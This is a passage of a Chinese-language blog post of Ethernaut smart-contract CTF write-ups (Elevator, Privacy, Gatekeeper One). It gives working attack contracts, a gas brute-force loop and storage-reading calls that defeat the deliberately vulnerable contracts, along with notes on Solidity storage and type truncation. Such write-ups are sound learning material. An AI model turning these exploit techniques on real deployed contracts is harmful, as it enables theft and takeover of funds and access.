<h3 id="题解-3"><a href="#题解-3" class="headerlink" title="题解"></a>题解</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Building &#123;</span><br><span class="line">    function isLastFloor(uint256) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract ElevatorAttack is Building&#123;</span><br><span class="line">    bool public top;</span><br><span class="line"></span><br><span class="line">    constructor(bool _top) &#123;</span><br><span class="line">        top = _top; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isLastFloor(uint256) external returns (bool)&#123;</span><br><span class="line">        top = !top;</span><br><span class="line">        return top;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>开始传入<code>top</code>为<code>true</code>，第一次调用<code>isLastFloor()</code>返回<code>false</code>，第二次返回<code>true</code>，达到目的效果；</p>
<h2 id="ethernaut-Privacy"><a href="#ethernaut-Privacy" class="headerlink" title="ethernaut - Privacy"></a>ethernaut - Privacy</h2><p><strong>description</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// The creator of this contract was careful enough to protect the sensitive areas of its storage.</span><br><span class="line"></span><br><span class="line">// Unlock this contract to beat the level.</span><br><span class="line"></span><br><span class="line">// Things that might help:</span><br><span class="line"></span><br><span class="line">// Understanding how storage works</span><br><span class="line">// Understanding how parameter parsing works</span><br><span class="line">// Understanding how casting works</span><br><span class="line">// Tips:</span><br><span class="line"></span><br><span class="line">// Remember that metamask is just a commodity. Use another tool if it is presenting problems. Advanced gameplay could involve using remix, or your own web3 provider.</span><br></pre></td></tr></table></figure>

<p>题目描述很可怕；</p>
<p><strong>source</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Privacy &#123;</span><br><span class="line">    bool public locked = true;</span><br><span class="line">    uint256 public ID = block.timestamp;</span><br><span class="line">    uint8 private flattening = 10;</span><br><span class="line">    uint8 private denomination = 255;</span><br><span class="line">    uint16 private awkwardness = uint16(block.timestamp);</span><br><span class="line">    bytes32[3] private data;</span><br><span class="line"></span><br><span class="line">    constructor(bytes32[3] memory _data) &#123;</span><br><span class="line">        data = _data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function unlock(bytes16 _key) public &#123;</span><br><span class="line">        require(_key == bytes16(data[2]));</span><br><span class="line">        locked = false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">    A bunch of super advanced solidity algorithms...</span><br><span class="line"></span><br><span class="line">      ,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`</span><br><span class="line">      .,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,</span><br><span class="line">      *.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^         ,---/V\</span><br><span class="line">      `*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.    ~|__(o.o)</span><br><span class="line">      ^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;  UU  UU</span><br><span class="line">    */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>data</code>可读，计算一下位置：</p>
<ul>
<li><p><code>bool locked</code>占第<code>0</code>个 slot；</p>
</li>
<li><p><code>uint256 ID</code>占第<code>1</code>个 slot ；</p>
</li>
<li><p><code>uint8 private flattening</code>，<code>uint8 private denomination</code>，<code>uint16 private awkwardness</code>占第<code>2</code>个 slot ；</p>
</li>
<li><p><code>bytes32[3] private data</code>占第<code>3,4,5</code>个 slot ；</p>
</li>
</ul>
<p><code>data[2]</code>在第<code>5</code>个 slot ；</p>
<h3 id="bytesn-，-uintn-，-intn-的显式转换"><a href="#bytesn-，-uintn-，-intn-的显式转换" class="headerlink" title="bytesn ， uintn ， intn 的显式转换"></a>bytesn ， uintn ， intn 的显式转换</h3><p>这三类数据类型的共同点，都具有多种不同的长度；</p>
<p>由短向长转换时，可以进行隐式转换，对于<code>uintn</code>和<code>intn</code>，高位会被填充使值不变；而对于<code>bytesn</code>，数组会向后延长，用一系列<code>0x00</code>填充多出来的<code>byte</code>；</p>
<p>由长向短转换时则不同，由于数据可能发生损失，系统不提供隐式转换，显式转换则会发生<strong>截断</strong>；</p>
<p>对于<code>uintn</code>和<code>intn</code>，会舍去高位保留低位（ <em>注意这里<code>intn</code>以<strong>补码</strong>存储</em> ）；而对于<code>bytesn</code>，数组会舍弃后面的<code>byte</code>单元；</p>
<h3 id="题解-4"><a href="#题解-4" class="headerlink" title="题解"></a>题解</h3><p>回到题目，首先读取<code>data[2]</code>；</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(instance,<span class="number">0x5</span>);</span><br><span class="line"><span class="comment">// &#x27;0x210bc33b722eb5853a8ba02dff9e264130c1a32ac266801344842632710f5b3c&#x27;</span></span><br></pre></td></tr></table></figure>

<p>为了转为<code>bytes16</code>，要取前一半，前 34 位（因为开头的<code>&#39;0x&#39;</code>），传给 <code>unlock()</code>；</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">unlock</span>(<span class="string">&#x27;0x210bc33b722eb5853a8ba02dff9e264130c1a32ac266801344842632710f5b3c&#x27;</span>.<span class="title function_">slice</span>(<span class="number">0</span>,<span class="number">34</span>));</span><br></pre></td></tr></table></figure>

<p>过了，好用，但我还是觉得动态类型语言傻逼，以上；</p>
<h2 id="ethernaut-Gatekeeper-One"><a href="#ethernaut-Gatekeeper-One" class="headerlink" title="ethernaut - Gatekeeper One"></a>ethernaut - Gatekeeper One</h2><p><strong>description</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// Make it past the gatekeeper and register as an entrant to pass this level.</span><br><span class="line"></span><br><span class="line">// Things that might help:</span><br><span class="line">// Remember what you&#x27;ve learned from the Telephone and Token levels.</span><br><span class="line">// You can learn more about the special function gasleft(), in Solidity&#x27;s documentation (see Units and Global Variables and External Function Calls).</span><br></pre></td></tr></table></figure>

<p><strong>source</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract GatekeeperOne &#123;</span><br><span class="line">    address public entrant;</span><br><span class="line"></span><br><span class="line">    modifier gateOne() &#123;</span><br><span class="line">        require(msg.sender != tx.origin);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier gateTwo() &#123;</span><br><span class="line">        require(gasleft() % 8191 == 0);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;);</span><br><span class="line">        require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;);</span><br><span class="line">        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), &quot;GatekeeperOne: invalid gateThree part three&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">        entrant = tx.origin;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>gateOne()</code>之前做过了，重点看<code>gateTwo()</code>和<code>gateThree()</code>；</p>
<p><code>gateTwo()</code>涉及<code>gasleft()</code>，在 Remix 中写一个测试函数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function testRequire() public &#123;</span><br><span class="line">    require(msg.sender != tx.origin);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>增了又删得知这个<code>require()</code>消耗<code>33gas</code>，调用时指定 gas 为一个<code>8191</code>的倍数加<code>33</code>即可；</p>
<p><code>gateThree()</code>是截断问题，首先明确，不同位数<code>uint</code>做比较 ， solidity 会将位数低的隐式转换为位数高的；</p>
<p><code>gateThree()</code>的三个愿望：</p>
<ol>
<li>part1 ： <code>uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)</code></li>
<li>part2 ： <code>uint32(uint64(_gateKey)) != uint64(_gateKey)</code></li>
<li>part3 ： <code>uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)</code></li>
</ol>
<p><em><strong>哦我操地址是 <code>20</code> 字节我一直记错成 <code>16</code> 字节；</strong></em></p>
<p>无伤大雅，看<code>part3</code>，要求<code>gatekey</code>的后 16 位是 <code>tx.origin</code>（钱包地址）的后 16 位（ 2 字节）， 因为<code>uint16</code>补全要与<code>uint32</code>相等，故 16-31 位是 0 （ 2 字节<code>0x00</code>）；</p>
<p>再看<code>part2</code>，截断再补全与原来不等，实际上要求前 32 位（ 4 字节）不全为<code>0x00</code>；</p>
<p>最后<code>part1</code>实际上已经被<code>part3</code>包含了，不再赘述；</p>
<h3 id="题解-5"><a href="#题解-5" class="headerlink" title="题解"></a>题解</h3><p>这里很多运算可以拿到合约里去做，但不这样做可以省一点<code>gas fee</code>，优雅是有代价的孩子；</p>
<p>展示省<code>gas</code>做法：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">player.<span class="title function_">slice</span>(-<span class="number">4</span>);</span><br><span class="line"><span class="comment">// &#x27;8796&#x27;</span></span><br></pre></td></tr></table></figure>

<p><code>_gatekey</code>可以为<code>0x1000000000008796</code>；</p>
<p><strong>attack contract</strong></p>
<p>8888 替换成钱包的后四位；</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface GatekeeperOne &#123;</span><br><span class="line">    function enter(bytes8 _gateKey) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract GatekeeperOneAttack &#123;</span><br><span class="line">    address public victim;</span><br><span class="line">    event log(bytes);</span><br><span class="line">    event log(bool);</span><br><span class="line">    event log(uint);</span><br><span class="line"></span><br><span class="line">    constructor (address _victim) &#123;</span><br><span class="line">        victim = _victim;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function exp() public&#123;</span><br><span class="line">        bool result;</span><br><span class="line">        bytes memory data;</span><br><span class="line">        for(uint i=0;i &lt; 300;i++)&#123;</span><br><span class="line">            (result,data)= victim.call&#123;gas:8191*3+i&#125;(abi.encodeWithSignature(&quot;enter(bytes8)&quot;,bytes8(uint64(0x1000000000008888))));</span><br><span class="line">            if(result)&#123;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        emit log(result);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="长进-2"><a href="#长进-2" class="headerlink" title="长进"></a>长进</h3><h4 id="call-传参类型问题"><a href="#call-传参类型问题" class="headerlink" title="call 传参类型问题"></a>call 传参类型问题</h4><p>坑了五个小时，从四点到九点；</p>
<p>这个调用：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abi.encodeWithSignature(&quot;enter(bytes8)&quot;,bytes8(uint64(0x1000000000008888)));</span><br></pre></td></tr></table></figure>

<p>一开始是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abi.encodeWithSignature(&quot;enter(bytes8)&quot;,0x1000000000008888);</span><br></pre></td></tr></table></figure>

<p>这个“隐式转换”不会报错（因为 solidity 不会也无法帮助你给<code>call()</code>的参数下判断），但是实际上这个函数调用是注定失败的，因为<code>uint64</code>无法隐式转换为<code>bytes8</code>，以上；</p>
<p>然后在这道题中，你大部分情况下会认为是<code>part2</code>导致的<code>revert()</code>，反复尝试爆破，很难想到这个问题，实际上还是对自己的代码不自信，这也是我反复了五个小时的原因；</p>
<h4 id="重复声明与作用域"><a href="#重复声明与作用域" class="headerlink" title="重复声明与作用域"></a>重复声明与作用域</h4><p>网上某个题解的 payload ， 能打通，但是有个天大的坑；</p>
<p>先贴代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function exploit() public &#123;</span><br><span class="line">       // 后四位是metamask上账户地址的低2个字节</span><br><span class="line">       bytes8 key=0xAAAAAAAA00004261;</span><br><span class="line">       bool result;</span><br><span class="line">       for (uint256 i = 0; i &lt; 120; i++) &#123;</span><br><span class="line">           (bool result, bytes memory data) = address(</span><br><span class="line">               target</span><br><span class="line">           ).call&#123;gas:i + 150 + 8191 * 3&#125;(abi.encodeWithSignature(&quot;enter(bytes8)&quot;,key));</span><br><span class="line">           if (result) &#123;</span><br><span class="line">               break;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       emit log(uint32(uint64(key)) == uint16(uint64(key)));</span><br><span class="line">       emit log(uint32(uint64(key)) != uint64(key));</span><br><span class="line">       emit log(uint32(uint64(key)) == uint16((address(tx.origin))));</span><br><span class="line">       emit log(result);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>问题很明显，<code>for</code>循环里面把<code>result</code>又声明了一遍，导致循环代码块里面的<code>result</code>和外面的不是一个，外面的会被赋缺省值<code>false</code>，且无论攻击有没有成功<code>log</code>都是<code>false</code>；</p>
<p>他这里<code>bytes8</code>处理的没问题，攻击是可以成功的，但我当时 copy 了这个代码下来跑几次，<code>log</code>输出都是<code>false</code>，误以为攻击失败了，怀疑人生，又开始改循环数目，多折腾了很久；</p>
<h2 id="人机"><a href="#人机" class="headerlink" title="人机"></a>人机</h2><p>好早啊；</p>
<p>夏天的风我永远记得，清清楚楚的说你爱我。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">QST137</p>
  <div class="site-description" itemprop="description">苍山岁岁有人去，唯愿洱海生白波。</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">14</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">5</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">19</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/Qst137" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Qst137" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:Q_ST@bupt.edu.cn" title="E-Mail → mailto:Q_ST@bupt.edu.cn" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">QST137</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
